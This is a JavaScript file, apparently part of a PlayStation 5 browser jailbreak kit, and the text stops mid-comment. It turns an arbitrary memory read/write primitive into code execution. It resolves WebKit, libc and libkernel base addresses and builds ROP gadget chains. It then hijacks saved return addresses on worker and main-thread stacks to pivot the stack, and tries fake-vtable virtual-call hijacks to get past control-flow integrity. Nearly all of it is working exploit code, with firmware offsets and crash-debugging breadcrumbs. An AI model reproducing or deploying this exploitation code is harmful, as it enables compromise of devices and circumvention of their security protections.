// Where the engine's own files (rop_slave.js, core.js, ...) live, and where the
// site root (offsets/, payloads/, ui/) lives, both relative to the *document*.
// slopkit/poops.html is inside slopkit/ so it keeps the historical defaults;
// the unified index.html at the site root overrides them before loading this.
var SLOPKIT_DIR = (typeof window !== "undefined" && window.SLOP_DIR !== undefined)
    ? window.SLOP_DIR : "";
var SLOPKIT_ROOT = (typeof window !== "undefined" && window.SLOP_ROOT !== undefined)
    ? window.SLOP_ROOT : "../";

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = [
    "7.00", "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"
];
const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "";
window.fw_float = parseFloat(window.fw_str);

if (!supportedFirmwares.includes(fw_str)) {

    alert(`Firmware ${fw_str} is unsupported.\n\nSupported: ${supportedFirmwares.join(", ")}`);
    throw new Error("no offsets for fw " + fw_str);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    /* Collect EVERY thread with a 0x80000 stack, not just the first.
       Returning the first match assumes the rop_slave worker is the only
       thread with that stack size and that it is earliest in the list.
       Neither is guaranteed, and picking the wrong one looks identical to a
       wrong OFFSET_lk_worker_wait_return: the fingerprint scan just finds 0.
       The caller now tries all of them. Also bounded -- the original walked
       until next==NULL, which spins forever, synchronously, on a bad list. */
    const MAX_THREADS = 512;
    const stacks = [];
    const sizes = [];
    let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
    for (let i = 0; i < MAX_THREADS && (thread.low != 0x0 || thread.hi != 0x0); i++) {
        if ((thread.low & 7) !== 0 || (thread.hi >>> 0) < 8 || (thread.hi >>> 0) > 9)
            throw new Error("_thread_list entry " + i + " is 0x" + thread.toString()
                + ", not a plausible pthread -- OFFSET_lk__thread_list (0x"
                + OFFSET_lk__thread_list.toString(16) + ") is wrong for this build");
        const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.hi === 0) sizes.push("0x" + stacksz.low.toString(16));
        if (stacksz.low == 0x80000 && stacksz.hi === 0) stacks.push(stack);
        thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    }
    jbmark("WORKER-STACKS", "n=" + stacks.length + "-of=" + sizes.length
        + "-sizes=" + sizes.join(","));
    if (!stacks.length)
        throw new Error("failed to find worker: no 0x80000 stack among "
            + sizes.length + " threads (sizes " + sizes.join(",") + ")");
    return stacks;
}

async function find_worker_return_slot(p, stacks, libKernelBase) {
    if (!Array.isArray(stacks)) stacks = [stacks];
    /* The profile may give one saved PC or a ranked list of them. A list is
       useful because several frames in the wait chain are equally valid pivot
       points -- the first entry that appears exactly once wins, so the profile
       author's ordering picks the frame, not luck. */
    const wants = (Array.isArray(OFFSET_lk_worker_wait_return)
        ? OFFSET_lk_worker_wait_return
        : [OFFSET_lk_worker_wait_return]).map(rva => ({
            rva: rva, addr: libKernelBase.add32(rva)
        }));
    let lastCount = 0;

    // The worker may answer immediately before returning to its idle wait.
    // The exact saved PC is the firmware-specific fingerprint. Do not require
    // the following qword to resemble an RSP: that adjacent slot is ABI/frame
    // layout dependent and 10.60 legitimately does not satisfy that heuristic.
    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (const stack of stacks) {
            for (const want of wants) {
                let hitHere = null, here = 0;
                for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
                    const candidate = stack.add32(offset);
                    const value = p.read8(candidate);
                    if (value.low !== want.addr.low || value.hi !== want.addr.hi)
                        continue;

                    hitHere = candidate;
                    here++;
                }
                if (here === 1) {
                    try { window.__wwrPicked = want.rva; } catch (e) {  }
                    jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hitHere.toString()
                        + "-rva=0x" + want.rva.toString(16)
                        + "-rank=" + wants.indexOf(want)
                        + "-of=" + wants.length
                        + "-stacks=" + stacks.length);
                    return hitHere;
                }
                count += here;
                if (hitHere) hit = hitHere;
            }
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }

    /* The fingerprint is not on the stack. Do not guess a replacement constant:
       we have an arbitrary read, so measure what the idle worker ACTUALLY
       parked on and put it in the error text, which this UI renders in full.
       Sweep the whole 512KB stack for qwords that land inside libkernel_web
       and report the distinct rvas, deepest (highest address) first -- the
       saved PC of the blocking call is the one near the top of the stack.
       Tally counts too: a genuine return address recurs across attempts,
       whereas stale garbage usually appears once. */
    const LK_SPAN = 0x100000;                 // generous libkernel_web image bound
    const seen = new Map();                   // rva -> {n, hi}
    for (const stack of stacks) {
        for (let offset = 0x40000; offset < 0x80000; offset += 0x8) {
            const v = p.read8(stack.add32(offset));
            const rel = (v.hi - libKernelBase.hi) * 0x100000000
                + (v.low - libKernelBase.low);
            if (rel < 0 || rel >= LK_SPAN) continue;
            const e = seen.get(rel);
            if (e) { e.n++; if (offset > e.hi) e.hi = offset; }
            else seen.set(rel, { n: 1, hi: offset });
        }
    }
    const top = [...seen.entries()]
        .sort((a, b) => b[1].hi - a[1].hi)
        .slice(0, 24)
        .map(([rva, e]) => "lk+0x" + rva.toString(16)
            + "@0x" + e.hi.toString(16) + (e.n > 1 ? "x" + e.n : ""));
    /* probe700.html established that on this build a byte in libkernel selects
       WHICH cond_wait_common body pthread_cond_wait actually calls. The saved
       PC only exists in the body that runs, so a fingerprint taken from the
       other one can never match no matter how correct it looks statically. */
    let selNote = "";
    if (typeof OFFSET_lk_cond_wait_selector !== "undefined") {
        const sw = p.read8(libKernelBase.add32(OFFSET_lk_cond_wait_selector));
        selNote = " cond_wait selector (lk+0x"
            + OFFSET_lk_cond_wait_selector.toString(16) + ") = "
            + (sw.low & 0xff)
            + " -- if the profile's fingerprint came from the OTHER body,"
            + " that alone explains count 0.";
    }
    jbmark("WORKER-RET-CANDIDATES", "tried=["
        + wants.map(w => "0x" + w.rva.toString(16)).join(",") + "]"
        + "-found=" + seen.size + "-" + top.join(" ") + selNote);
    throw new Error("worker wait return fingerprint count " + lastCount
        + ", expected 1. OFFSET_lk_worker_wait_return candidates ["
        + wants.map(w => "0x" + w.rva.toString(16)).join(",") + "]"
        + " is not on the worker stack for fw " + window.fw_str + "."
        + " " + stacks.length + " candidate stack(s); "
        + seen.size + " libkernel pointers in the top half,"
        + " highest stack offset first (= OLDEST frame; the parked"
        + " cond_wait PC is among the LOWEST offsets): "
        + (top.length ? top.join("  ") : "NONE")
        + selNote);
}

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
}

/* Crash-persistent breadcrumbs.
   ---------------------------------------------------------------------------
   Once the chain is armed, a mistake kills the WebProcess synchronously: the
   coredump names no address, every queued jbmark is lost, and the screen shows
   whatever it showed before the pivot. That is how 0xa0020307 arrived with the
   log ending at MODULE-BASES. localStorage is the only thing that outlives the
   process, so commit a marker BEFORE each irreversible step and read the trail
   back on the next load -- the last crumb written is where it died. */
/* ?probe=pivot | ?probe=null -- bisect the chain launch.
   The trail says we die AFTER postMessage, i.e. the worker really does return
   through the hijacked frame and control reaches our gadgets; something in the
   chain then kills it. These two probes split that span in half. */
let PROBE = (function () {
    try { return new URLSearchParams(location.search).get("probe") || ""; }
    catch (e) { return ""; }
})();
const CRUMB_KEY = "slopkit-crumbs";
function crumb(tag) {
    try {
        const prev = localStorage.getItem(CRUMB_KEY) || "";
        localStorage.setItem(CRUMB_KEY, prev + (prev ? ">" : "") + tag);
    } catch (e) {  }
}
function crumbsTake() {
    try {
        const v = localStorage.getItem(CRUMB_KEY) || "";
        localStorage.removeItem(CRUMB_KEY);
        return v;
    } catch (e) { return ""; }
}

async function prepare(p) {

    const prevCrumbs = crumbsTake();
    if (prevCrumbs) {
        const parts = prevCrumbs.split(">");
        const last = parts[parts.length - 1];
        jbmark("PREV-CRUMBS", "died-after=" + parts.slice(-5).reverse().join(" <= ")
            + " (" + parts.length + " steps)");
        /* Self-sequencing bisect. renderNav() is stubbed in this build, so the
           console has no way to reach a ?probe= URL -- escalate automatically
           on the run after a crash instead, driven by where the last one died. */
        if (!PROBE && last === "nc") {
            PROBE = "pivot";
            jbmark("PROBE-AUTO", "the empty chain died, so setjmp/longjmp or the"
                + " pivot itself is at fault, not the syscall stub"
                + " -- escalating to probe=pivot this run");
        } else if (!PROBE && last.indexOf("probe-pivot") === 0) {
            jbmark("PROBE-VERDICT", "the previous run died at '" + last
                + "', i.e. the WORKER CRASHED with only a `jmp $` written into"
                + " the return slot. Nothing of ours executed but that one"
                + " store, so the hijacked slot is not a live return address"
                + " for this frame -- the frame choice is wrong, not the chain."
                + " Re-rank OFFSET_lk_worker_wait_return (0x39843 / 0x33d1e).");
        }
    }
    crumb("prep");

    let textArea = document.createElement("textarea");

    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    let textAreaVtable = p.read8(textAreaVtPtr);

    // 9.00+ has no vtable rva; resolve from the host constructor instead.
    // 7.00's profile also ships host-constructor candidates, so the gate is
    // "does this profile have candidates", not a firmware number -- profiles
    // without them still fall back to the vtable rva below.
    // A candidate is accepted only if it lands page-aligned in the user-module
    // band, so a wrong one is rejected rather than used.
    let libSceNKWebKitBase = null;
    if (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
                    + "-base=0x" + wb.toString(16));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
                + ctor.toString(16) + ")");
    } else {
        jbmark("WEBKIT-BASE-VTABLE", "fw=" + window.fw_str
            + "-ctor=" + (typeof globalThis.__ps5NativeCtor === "number"
                ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
            + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                ? OFFSET_wk_host_constructor_candidates.length : "none"));
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    // once per run, before any racer exists
    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }

        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    // -----------------------------------------------------------------------
    // 7.00 bootstrap (OFFSET_wk_bootstrap === "selfstack").
    //
    // CFI-immune: hijack a return address on our own main-thread stack. A sort
    // comparator runs with sort's native CallFrame live; the comparator's own
    // CallFrame (JSC 613: Register=8B, returnPC at +0x08, codeBlock at +0x10,
    // callee at +0x18, arg0 at +0x30) holds the return address into sort. We
    // put a distinctive JSValue marker as arg0, scan the 2MB main stack for it,
    // and verify the frame by checking callee == the comparator's own cell.
    // This step REPORTS the located returnPC only (no overwrite) so it cannot
    // crash; the pivot is wired once the locate is confirmed on device.
    if (typeof OFFSET_wk_bootstrap !== "undefined"
        && OFFSET_wk_bootstrap === "selfstack") {
        // Synchronous crash-proof logger: each step is committed to
        // localStorage BEFORE the next (a queued jbmark is lost on a
        // synchronous crash). The previous run's trail is painted on screen at
        // the top so a crashing pivot is still diagnosable on the next boot.
        const NL = String.fromCharCode(10);
        function selfLog(tag, detail) {
            const line = tag + (detail ? " " + detail : "");
            try {
                localStorage.setItem("slopself",
                    (localStorage.getItem("slopself") || "") + line + NL);
            } catch (e) {}
            try { jbmark(tag, detail); } catch (e) {}
        }
        let prevTrail = "";
        try { prevTrail = localStorage.getItem("slopself") || ""; } catch (e) {}
        try {
            let sink = document.getElementById("selfsink");
            if (!sink) {
                sink = document.createElement("pre");
                sink.id = "selfsink";
                sink.setAttribute("style",
                    "position:fixed;top:0;left:0;right:0;z-index:99999;margin:0;"
                    + "background:#000;color:#0f0;font:11px monospace;"
                    + "white-space:pre-wrap;max-height:100vh;overflow:auto;padding:4px");
                document.body.appendChild(sink);
            }
            sink.textContent = prevTrail
                ? "=== PREVIOUS SELFSTACK TRAIL (last completed line = where it died) ===" + NL
                    + prevTrail
                : "=== selfstack: no previous trail (first run) ===";
        } catch (e) {}
        try { localStorage.removeItem("slopself"); } catch (e) {}
        // let the browser PAINT the previous trail before we risk crashing.
        await new Promise(r => setTimeout(r, 120));
        selfLog("SELF-BEGIN", "fw=" + window.fw_str);

        // Enumerate every thread stack -- we do not assume which thread runs
        // our JS. (base, size) pairs from _thread_list.
        const stacks = [];
        for (let t = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
             t.low || t.hi; t = p.read8(t.add32(0x38))) {
            const sa = p.read8(t.add32(0xA8));
            const sz = p.read8(t.add32(0xB0));
            if ((sa.low || sa.hi) && sz.hi === 0 && sz.low >= 0x4000
                && sz.low <= 0x400000)
                stacks.push([sa, sz.low]);
        }
        selfLog("SELF-STACKS", "count=" + stacks.length + "-sizes="
            + stacks.map(x => "0x" + x[1].toString(16)).join(","));

        const M0 = 0x13370001, M1 = 0x13370002, TAG = 0xffff0000;
        let comparatorAddr = null;

        function inAnyStack(v) {
            for (const [b, sz] of stacks) {
                if ((v.hi >>> 0) !== (b.hi >>> 0)) continue;
                const rel = (v.low >>> 0) - (b.low >>> 0);
                if (rel >= 0 && rel < sz && (v.low & 7) === 0) return true;
            }
            return false;
        }
        // Find the live comparator CallFrame: a stack qword == comparatorAddr
        // (callee at CF+0x18) whose CF+0x00 is a stack ptr and CF+0x20 (argc) is
        // small. Returns { cf } or null.
        function findFrame() {
            const lo = comparatorAddr.low >>> 0, hi = comparatorAddr.hi >>> 0;
            const b0 = lo & 0xff, b1 = (lo >>> 8) & 0xff,
                  b2 = (lo >>> 16) & 0xff, b3 = (lo >>> 24) & 0xff;
            for (const [base, size] of stacks) {
                const view = array_from_address(base, size);
                for (let o = 0x18; o + 0x28 <= size; o += 8) {
                    if (view[o] !== b0 || view[o+1] !== b1
                        || view[o+2] !== b2 || view[o+3] !== b3) continue;
                    const slot = base.add32(o);
                    const full = p.read8(slot);
                    if (full.low !== lo || (full.hi >>> 0) !== hi) continue;
                    const cf = base.add32(o - 0x18);
                    const caller = p.read8(cf);
                    const argc = p.read8(cf.add32(0x20));
                    if (inAnyStack(caller) && (argc.low >>> 0) >= 1
                        && (argc.low >>> 0) <= 0x10)
                        return cf;
                }
            }
            return null;
        }

        const G = gadgets;
        function gaddr(n) { const g = G[n]; if (!g) throw new Error("missing gadget " + n); return g; }

        // PRE-ALLOCATE everything BEFORE the sort. Allocating inside the
        // comparator (mid-sort) triggers GC/reentrancy and faults -- that was
        // the earlier 0xa0020328. Inside the comparator we only WRITE, never
        // allocate. The chain skeleton is built now; the four cf-dependent
        // values are patched in when we trigger.
        const scratch = malloc(0x20);
        const MAGIC = new int64(0x1337c0de, 0x0defaced);
        p.write8(scratch, new int64(0, 0));
        const chainBuf = malloc(0x400);
        const chainEntry = chainBuf;
        // Isolation stack for the pivot test: pivot lands here, which just loops.
        const pivotBuf = malloc(0x20);
        p.write8(pivotBuf, gaddr("infloop"));

        // slot indices into chainBuf that get patched at trigger time
        const S_RETSLOT = 6, S_ORIGRET = 8, S_CBSLOT = 11, S_ORIGCB = 13,
              S_FINAL_RETSLOT = 18;
        let ci = 0;
        const put = (v) => { p.write8(chainBuf.add32(ci * 8), v); ci++; };
        // 1) MAGIC -> scratch
        put(gaddr("pop rdi")); put(scratch);              // 0,1
        put(gaddr("pop rax")); put(MAGIC);                // 2,3
        put(gaddr("mov [rdi], rax"));                     // 4
        // 2) restore CF+0x08 := origRet   (retSlot / origRet patched in later)
        put(gaddr("pop rdi")); put(new int64(0, 0));      // 5,6  <- S_RETSLOT
        put(gaddr("pop rax")); put(new int64(0, 0));      // 7,8  <- S_ORIGRET
        put(gaddr("mov [rdi], rax"));                     // 9
        // 3) restore CF+0x10 := origCB    (cbSlot / origCB patched in later)
        put(gaddr("pop rdi")); put(new int64(0, 0));      // 10,11 <- S_CBSLOT
        put(gaddr("pop rax")); put(new int64(0, 0));      // 12,13 <- S_ORIGCB
        put(gaddr("mov [rdi], rax"));                     // 14
        // 4) comparator return value = boxed int 0 ("equal")
        put(gaddr("pop rax")); put(new int64(0x00000000, 0xffff0000)); // 15,16
        // 5) clean return: rsp := retSlot ; ret pops origRet (now restored)
        put(gaddr("pop rsp")); put(new int64(0, 0));      // 17,18 <- S_FINAL_RETSLOT

        let done = false, calls = 0, armed = false, origRet = null, origCB = null;
        const comparator = function (a, b) {
            calls++;
            // Only hijack once we are ARMED (i.e. during the real sort). The
            // warmup below calls this directly many times with armed=false to
            // force BASELINE JIT -- so its epilogue is a native `ret` that
            // leaves rsp = CF+0x10 (LLInt's software op_ret does not, which is
            // why the earlier pivot crashed).
            if (done || !armed) return (a >>> 0) - (b >>> 0);
            const cf = findFrame();
            if (!cf) return (a >>> 0) - (b >>> 0);
            done = true;
            const retSlot = cf.add32(0x08);
            const cbSlot = cf.add32(0x10);
            origRet = p.read8(retSlot);
            origCB = p.read8(cbSlot);

            // Patch the cf-dependent values into the pre-built chain (writes only)
            p.write8(chainBuf.add32(S_RETSLOT * 8), retSlot);
            p.write8(chainBuf.add32(S_ORIGRET * 8), origRet);
            p.write8(chainBuf.add32(S_CBSLOT * 8), cbSlot);
            p.write8(chainBuf.add32(S_ORIGCB * 8), origCB);
            p.write8(chainBuf.add32(S_FINAL_RETSLOT * 8), retSlot);

            const cbLooksHeap = (origCB.hi >>> 0) >= 0x8 && (origCB.hi >>> 0) <= 0x9ff;
            selfLog("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
                + "-retSlot=0x" + retSlot.toString()
                + "-chainEntry=0x" + chainEntry.toString()
                + "-origRet=0x" + origRet.toString()
                + "-origCB=0x" + origCB.toString()
                + "-cbLooksHeap=" + cbLooksHeap);

            // Full pivot: CF+0x10 = chainEntry, CF+0x08 = pop rsp. On the JS
            // return, the BASELINE native ret pops CF+0x08 -> pop rsp -> rsp =
            // [CF+0x10] = chainEntry -> chain writes MAGIC, restores both slots,
            // returns cleanly into sort.
            p.write8(cbSlot, chainEntry);
            p.write8(retSlot, gaddr("pop rsp"));
            selfLog("SELF-PIVOT-FIRED", "baseline pivot armed; returning now");
            return 0;
        };
        comparatorAddr = p.leakval(comparator);
        nogc.push(comparator);
        selfLog("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());

        // Warm up with direct JS->JS calls (these count toward tier-up, unlike
        // host-boundary sort calls). ~600 hits baseline JIT without going DFG.
        let warmSink = 0;
        for (let k = 0; k < 600; k++) warmSink += comparator(k & 0xffff, (k + 1) & 0xffff);
        selfLog("SELF-WARMUP", "calls=" + calls + "-sink=" + warmSink
            + "-(should now be baseline-JIT)");

        // Now arm and run a SMALL sort so only a few extra (baseline) calls
        // happen -- the first hijacks the frame.
        armed = true;
        const arr = [M0, M1, M0, M1, M0, M1, M0, M1];
        arr.sort(comparator);

        const got = p.read8(scratch);
        selfLog("SELF-PIVOT-RESULT", "armed=" + done + "-calls=" + calls
            + "-scratch=0x" + got.toString()
            + "-magicMatch=" + (got.low === MAGIC.low && got.hi === MAGIC.hi));
        if (!(got.low === MAGIC.low && got.hi === MAGIC.hi))
            throw new Error("selfstack pivot: chain did not run / magic not "
                + "written (armed=" + done + ", calls=" + calls + "). If the page "
                + "survived, the comparator epilogue was not a native ret off "
                + "CF+0x08 -- warm up harder or find the native return slot.");
        selfLog("SELF-PIVOT-OK", "RIP CONTROL on the main thread via self-stack "
            + "return hijack -- chain ran and returned cleanly (magic=0x"
            + got.toString() + ")");
        throw new Error("selfstack PIVOT OK: CFI-immune RIP control achieved on "
            + "the main thread. Next: run the real payload chain / spawn host thread.");
    }

    // -----------------------------------------------------------------------
    // 7.00 bootstrap milestone (OFFSET_wk_bootstrap === "fakevtable").
    //
    // The idle-Worker hijack that every other profile uses cannot work here:
    // on JSC 613 the Worker does not park at a return address any scan can find
    // (its blocking primitive is a raw syscall, and the PLT is `jmp [GOT]`, so
    // nothing that resumes it does so through a stack `ret` we can overwrite).
    //
    // Replacement plan: fake a C++ vtable on the leaked textarea's impl object
    // and let a virtual dispatch hand us `rdi = this` = a known address. That
    // is enough for `longjmp(this)` to pivot into a ROP chain, and later to
    // spawn a dedicated host thread (rop.js thread_rop) so nothing idle is ever
    // hijacked again.
    //
    // This block is ONLY the first, non-destructive verification: point every
    // fake vtable slot at setjmp and find which JS/DOM operation actually
    // performs a controllable virtual call. setjmp ignores its args and just
    // saves registers, so a hit rewrites impl[0..0x48] into a jmp_buf whose
    // +0x00 is a WebKit text address and +0x10 is a stack address -- a
    // signature we can read back. That same call captures the return context
    // the full launcher needs, so a positive result unblocks the rest.
    if (typeof OFFSET_wk_bootstrap !== "undefined"
        && OFFSET_wk_bootstrap === "fakevtable") {
        const SETJMP = libSceLibcInternalBase.add32(OFFSET_lc_setjmp);
        const impl = textAreaVtPtr;              // C++ HTMLTextAreaElement*
        const realVtable = textAreaVtable;       // its genuine vtable
        const N = 64;                            // slots to shadow

        // Build a fake vtable: copy N real entries, then overwrite them all
        // with setjmp. Any virtual that fires lands on setjmp.
        const fakeVtable = malloc(0x8 * (N + 2));
        for (let i = 0; i < N; i++)
            p.write8(fakeVtable.add32(i * 8), p.read8(realVtable.add32(i * 8)));

        const SIG_LO = SETJMP; // (unused sentinel; kept for symmetry)

        function looksLikeJmpBuf() {
            const rip = p.read8(impl);                    // impl[0x00]
            const rsp = p.read8(impl.add32(0x10));        // impl[0x10]
            const ripInWk = rip.sub32(libSceNKWebKitBase);
            const wkOk = ripInWk.hi === 0 && (ripInWk.low >>> 0) < 0x3673d22
                && (ripInWk.low >>> 0) > 0x1000;
            // a stack pointer on PS5 is a high canonical userland address
            const stackOk = (rsp.hi >>> 0) >= 0x7 && (rsp.hi >>> 0) <= 0x8ff
                && (rsp.low & 0xf) === 0;
            return { wkOk, stackOk, rip, rsp };
        }

        // Preserve the impl object's first 0x48 bytes; setjmp overwrites them
        // (rdi = impl), so we restore between trials to keep the textarea usable.
        const implSave = [];
        for (let i = 0; i < 9; i++) implSave.push(p.read8(impl.add32(i * 8)));
        function restoreImpl() {
            for (let i = 0; i < 9; i++) p.write8(impl.add32(i * 8), implSave[i]);
        }

        // Simpler property reads first (least likely to reach a CFI-guarded
        // polymorphic dispatch); heavier DOM ops last. Whichever op leaves a
        // jmp_buf in impl used an UNGUARDED virtual call -- that is the vector.
        const trials = [
            ["nodeName",  () => { void textArea.nodeName; }],
            ["localName", () => { void textArea.localName; }],
            ["tagName",   () => { void textArea.tagName; }],
            ["value",     () => { void textArea.value; }],
            ["type",      () => { void textArea.type; }],
            ["toString",  () => { void textArea.toString(); }],
            ["scrollTop", () => { void textArea.scrollTop; }],
            ["focus",     () => textArea.focus()],
            ["blur",      () => textArea.blur()],
            ["select",    () => textArea.select()],
            ["click",     () => textArea.click()]
        ];

        let winner = null;
        for (const [name, op] of trials) {
            // FVT-TRY is committed to the screen BEFORE the op. If the op
            // performs a CFI-GUARDED virtual call through our out-of-range fake
            // vtable, it traps (ud2 -> SIGILL) and the process dies here -- so
            // an FVT-TRY with no following FVT-RESULT names the guarded op.
            p.write8(impl, fakeVtable);
            jbmark("FVT-TRY", "op=" + name + "-impl=0x" + impl.toString()
                + "-fakevt=0x" + fakeVtable.toString());
            let threw = "";
            try { op(); } catch (e) { threw = String(e && e.message).slice(0, 60); }
            const r = looksLikeJmpBuf();
            jbmark("FVT-RESULT", "op=" + name
                + "-rip=0x" + r.rip.toString() + "-wkOk=" + r.wkOk
                + "-rsp=0x" + r.rsp.toString() + "-stackOk=" + r.stackOk
                + (threw ? "-threw=" + threw : ""));
            if (r.wkOk && r.stackOk) { winner = { name, rip: r.rip, rsp: r.rsp }; break; }
            restoreImpl();
        }

        if (winner) {
            jbmark("FVT-HIT", "op=" + winner.name
                + "-savedRip=0x" + winner.rip.toString()
                + "-savedRsp=0x" + winner.rsp.toString()
                + "  <== controllable virtual call; set OFFSET_wk_vtable_trigger to this op");
            throw new Error("bootstrap milestone: fake-vtable virtual call CONFIRMED via '"
                + winner.name + "'. Next step: wire the longjmp launcher.");
        }
        restoreImpl();
        jbmark("FVT-DONE", "no-op-produced-a-clean-virtual-call"
            + "-all-either-noop-or-CFI-guarded");
        throw new Error("bootstrap milestone: no trial produced a controllable "
            + "virtual call (all no-op or CFI-guarded). Pivot to a CFI-immune "
            + "primitive (jmp_buf / return-address).");
    }

    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    let worker = new Worker(SLOPKIT_DIR + "rop_slave.js");

    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
    await wait_for_worker();
    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

    crumb("fw");
    let worker_stacks = find_worker(p, libKernelBase);
    let worker_stack = worker_stacks[0];
    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
        + "-candidates=" + worker_stacks.length
        + "-next=malloc(0x40)+worker_rop(0xC0000)");
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = await find_worker_return_slot(p, worker_stacks, libKernelBase);
    } else {
        // Backward-compatible path for original profiles without a saved-PC fingerprint.
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }
    crumb("rs" + (window.__wwrPicked !== undefined
        ? "/rva0x" + window.__wwrPicked.toString(16) : ""));
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {

        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {

        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        if (window.jb && window.jb.hot)
            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
                + "-poprsp=0x" + gadgets["pop rsp"].toString()
                + "-rsp=0x" + chain.stack_entry_point.toString());

        if (PROBE === "pivot") {
            /* Write a `jmp $` instead of the pivot and change nothing else.
               If the worker then goes quiet WITHOUT crashing, the hijacked
               return address is genuinely executed -- the frame, the slot and
               the wake path are all correct, and the fault is purely in what
